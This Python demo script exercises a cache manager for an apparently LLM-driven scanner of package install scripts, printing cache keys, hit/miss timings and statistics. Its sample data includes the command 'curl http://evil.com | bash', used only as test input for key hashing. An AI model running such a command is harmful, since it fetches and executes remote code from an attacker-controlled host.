"""
Demo script to show cache integration in action.
This demonstrates how caching improves performance in the analysis pipeline.
"""

import time
from tools.cache_manager import get_cache_manager

def demo_cache_integration():
    """Demonstrate cache integration with simple examples."""
    
    print("=" * 60)
    print("Cache Integration Demo")
    print("=" * 60)
    
    # Get cache manager
    cache_manager = get_cache_manager()
    
    # Clear cache for clean demo
    cache_manager.clear_all()
    print("\n✓ Cache cleared for demo")
    
    # Demo 1: Cache key generation
    print("\n" + "=" * 60)
    print("Demo 1: Content Hash Consistency (Property 9)")
    print("=" * 60)
    
    script1 = "curl http://evil.com | bash"
    script2 = "curl http://evil.com | bash"  # Identical
    script3 = "npm install"  # Different
    
    key1 = cache_manager.generate_cache_key(f"pkg1:{script1}", prefix="llm_script")
    key2 = cache_manager.generate_cache_key(f"pkg1:{script2}", prefix="llm_script")
    key3 = cache_manager.generate_cache_key(f"pkg1:{script3}", prefix="llm_script")
    
    print(f"\nScript 1: {script1}")
    print(f"Key 1:    {key1[:16]}...")
    print(f"\nScript 2: {script2} (identical)")
    print(f"Key 2:    {key2[:16]}...")
    print(f"Keys match: {key1 == key2} ✓")
    
    print(f"\nScript 3: {script3} (different)")
    print(f"Key 3:    {key3[:16]}...")
    print(f"Keys differ: {key1 != key3} ✓")
    
    # Demo 2: Cache-first lookup
    print("\n" + "=" * 60)
    print("Demo 2: Cache-First Lookup (Property 6)")
    print("=" * 60)
    
    test_key = "demo_key"
    test_result = {
        "is_suspicious": True,
        "confidence": 0.95,
        "severity": "critical",
        "threats": ["Remote code execution"]
    }
    
    # First lookup - cache miss
    print("\nFirst lookup (cache miss):")
    start = time.time()
    cached = cache_manager.get_llm_analysis(test_key)
    elapsed = (time.time() - start) * 1000
    print(f"  Result: {cached}")
    print(f"  Time: {elapsed:.2f}ms")
    
    # Store result
    cache_manager.store_llm_analysis(test_key, test_result)
    print(f"\n✓ Stored result in cache")
    
    # Second lookup - cache hit
    print("\nSecond lookup (cache hit):")
    start = time.time()
    cached = cache_manager.get_llm_analysis(test_key)
    elapsed = (time.time() - start) * 1000
    print(f"  Result: {cached}")
    print(f"  Time: {elapsed:.2f}ms")
    print(f"  Cache hit: {cached is not None} ✓")
    
    # Demo 3: Cache statistics
    print("\n" + "=" * 60)
    print("Demo 3: Cache Statistics Tracking")
    print("=" * 60)
    
    # Add more entries
    for i in range(5):
        key = f"test_key_{i}"
        value = {"result": f"test_{i}"}
        cache_manager.store_llm_analysis(key, value)
    
    # Access some entries (create hits)
    for i in range(3):
        key = f"test_key_{i}"
        cache_manager.get_llm_analysis(key)
    
    # Get statistics
    stats = cache_manager.get_statistics()
    
    print(f"\nCache Statistics:")
    print(f"  Backend: {stats['backend']}")
    print(f"  Total Entries: {stats['total_entries']}")
    print(f"  Total Hits: {stats['total_hits']}")
    print(f"  Cache Size: {stats['size_mb']} MB")
    print(f"  Utilization: {stats['utilization_percent']}%")
    
    # Demo 4: Performance comparison
    print("\n" + "=" * 60)
    print("Demo 4: Performance Comparison")
    print("=" * 60)
    
    # Simulate cache miss (first call)
    print("\nSimulated first analysis (cache miss):")
    print("  - Check cache: ~1ms")
    print("  - Call LLM API: ~2000ms")
    print("  - Store in cache: ~5ms")
    print("  Total: ~2006ms")
    
    # Simulate cache hit (subsequent call)
    print("\nSimulated subsequent analysis (cache hit):")
    print("  - Check cache: ~1ms")
    print("  - Return cached result: ~0ms")
    print("  Total: ~1ms")
    
    print("\n✓ Performance improvement: ~2000x faster!")
    print("✓ API cost reduction: 100% (no API call)")
    
    print("\n" + "=" * 60)
    print("Demo Complete!")
    print("=" * 60)
    print("\nKey Takeaways:")
    print("  1. Cache-first lookup ensures cache is always checked")
    print("  2. Identical content produces identical cache keys")
    print("  3. Cache hits are extremely fast (< 1ms)")
    print("  4. Statistics tracking enables monitoring")
    print("  5. Significant performance and cost improvements")
    
    # Cleanup
    cache_manager.clear_all()
    print("\n✓ Cache cleared")


if __name__ == "__main__":
    demo_cache_integration()
